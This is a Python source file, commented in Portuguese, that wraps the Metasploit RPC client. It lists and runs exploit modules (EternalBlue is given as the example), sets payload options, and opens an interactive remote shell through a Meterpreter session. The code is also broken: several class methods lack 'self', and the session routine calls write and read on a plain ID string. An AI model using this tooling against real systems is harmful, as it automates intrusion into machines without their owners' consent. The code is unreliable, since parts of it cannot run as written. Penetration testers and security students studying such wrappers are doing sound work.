from pymetasploit3.msfrpc import MsfRpcClient
import socket


class MetasploitClient:
    def __init__(self, password, port=55553):
        self.client = MsfRpcClient(password, port=port)

    def list_exploits(self):
        """Lista e imprime todos os exploits disponíveis."""
        exploits = self.client.modules.exploits
        print("Exploits disponíveis:")
        # for exploit in exploits:
            # print(f"- {exploit}")
        return exploits

    def run_exploit(self, exploit_name, options, confirm=True):
        """
        Executa um exploit com as opções configuradas.

        :param exploit_name: Nome do exploit (ex: 'windows/smb/ms17_010_eternalblue').
        :param options: Dicionário de opções configuradas.
        :param confirm: Se True, pede confirmação antes de executar o exploit.
        """
        try:
            # Obtém o módulo do exploit
            exploit = self.client.modules.use('exploit', exploit_name)

            # Configura as opções do exploit
            for opcao, valor in options.items():
                exploit[opcao] = valor

            # Verifica se todos os parâmetros obrigatórios foram definidos
            if not all([exploit_name, options]):
                raise ValueError("Todos os parâmetros (exploit_name, options) são obrigatórios.")

            # Pede confirmação antes de executar
            if confirm:
                print(f"Você está prestes a executar o exploit {exploit_name}.")
                print("Opções configuradas:")
                for opcao, valor in options.items():
                    print(f"{opcao}: {valor}")
                resposta = input("Tem certeza que deseja continuar? (s/n): ").strip().lower()
                if resposta != 's':
                    print("Exploit cancelado.")
                    return

            # Executa o exploit
            print(f"Executando exploit {exploit_name}...")
            result = exploit.execute()

            if result and 'session_id' in result:
                print(f"Sessão criada: {result['session_id']}")
                return result['session_id']
            else:
                print("Falha ao executar o exploit.")
                return None

        except Exception as e:
            print(f"Erro ao executar o exploit {exploit_name}: {e}")
            return None

    def listar_payloads(porta, payloads):
        """Lista os payloads disponíveis para uma porta específica."""
        if porta in payloads:
            print(f"\nPayloads disponíveis para a porta {porta}:")
            for i, payload in enumerate(payloads[porta], 1):
                print(f"{i}. {payload['nome']}")
        else:
            print(f"\nNenhum payload disponível para a porta {porta}.")

    def resolver_dominio(dominio):
        """Resolve um nome de domínio para um endereço IP."""
        try:
            ip = socket.gethostbyname(dominio)
            return ip
        except socket.error as e:
            print(f"Erro ao resolver o domínio {dominio}: {e}")
            return None

    def configurar_payload(client, module_name):
        """
        Configura as opções necessárias para um módulo (exploit ou payload).
        Detecta automaticamente se o módulo é um exploit ou um payload.

        :param client: Cliente do Metasploit.
        :param module_name: Nome do módulo (exploit ou payload).
        :return: Dicionário com as opções configuradas.
        """
        try:
            # Verifica se o módulo é um exploit
            if module_name in client.modules.exploits:
                module_type = 'exploit'
            # Verifica se o módulo é um payload
            elif module_name in client.modules.payloads:
                module_type = 'payload'
            else:
                print(f"Erro: O módulo {module_name} não foi encontrado na lista de exploits ou payloads.")
                return {}

            # Tenta usar o módulo
            print(f"Debug: Tentando usar o módulo {module_name} do tipo {module_type}...")
            module = client.modules.use(module_type, module_name)
            print(f"Debug: Módulo retornado: {module}")  # Debug: Inspeciona o objeto retornado

            # Verifica se o módulo é válido
            if not hasattr(module, 'options'):
                print(f"Erro: O módulo {module_name} não possui opções válidas.")
                return {}

            # Inspeciona o objeto module.options
            print(f"Debug: Tipo de module.options: {type(module.options)}")
            print(f"Debug: Conteúdo de module.options: {module.options}")

            # Inspeciona o objeto module.runoptions
            print(f"Debug: Tipo de module.runoptions: {type(module.runoptions)}")
            print(f"Debug: Conteúdo de module.runoptions: {module.runoptions}")

            # Simula o comando 'show info'
            print(f"\n[+] Informações do módulo {module_name}:")
            print(f"Descrição: {getattr(module, 'description', 'Sem descrição')}")
            print(f"Referências: {getattr(module, 'references', [])}")
            print(f"Autores: {getattr(module, 'author', 'Desconhecido')}")  # Usa 'Desconhecido' se 'author' não existir

            # Simula o comando 'show options'
            print("\n[+] Opções do módulo:")
            options = module.options

            # Verifica se as opções são uma lista
            if not isinstance(options, list):
                print(f"Erro: As opções do módulo {module_name} não são uma lista.")
                return {}

            # Exibe as opções e coleta as obrigatórias
            opcoes_obrigatorias = {}
            for opcao in options:
                try:
                    # Acessa os detalhes da opção
                    valor = module.runoptions[opcao]
                    print(f"{opcao}: {valor} (Tipo: {type(valor).__name__})")
                    # Verifica se a opção é obrigatória
                    if hasattr(module, 'required') and opcao in module.required:
                        opcoes_obrigatorias[opcao] = {
                            'valor': valor,
                            'tipo': type(valor).__name__,
                            'descricao': getattr(module, f'{opcao}_desc', 'Sem descrição')
                        }
                except Exception as e:
                    print(f"Erro ao acessar detalhes da opção {opcao}: {e}")

            # Configura as opções obrigatórias
            opcoes_configuradas = {}
            print("\n[+] Configurando opções obrigatórias:")
            for opcao, detalhes in opcoes_obrigatorias.items():
                valor_padrao = detalhes['valor']
                valor = input(f"Digite o valor para {opcao} (padrão: {valor_padrao}): ").strip()
                opcoes_configuradas[opcao] = valor if valor else valor_padrao

            return opcoes_configuradas

        except Exception as e:
            print(f"Erro ao configurar o módulo {module_name}: {e}")
            return {}


    def acessar_sessao(session_id):
        """
        Acessa uma sessão do Metasploit usando o session_id.
        """
        try:
            # Acessa a sessão
            sessao = session_id
            if not sessao:
                print(f"Sessão {session_id} não encontrada.")
                return

            print(f"\nAcessando sessão {session_id}...")

            # Exemplo: Executa o comando 'sysinfo' no Meterpreter
            print("Executando comando 'sysinfo'...")
            sessao.write("sysinfo\n")
            output = sessao.read()
            print("Saída do comando 'sysinfo':")
            print(output)

            # Exemplo: Abre um shell interativo
            print("\nAbrindo shell interativo...")
            sessao.write("shell\n")
            while True:
                comando = input("shell> ").strip()
                if comando.lower() in ["exit", "quit"]:
                    break
                sessao.write(comando + "\n")
                output = sessao.read()
                print(output)

        except Exception as e:
            print(f"Erro ao acessar a sessão {session_id}: {e}")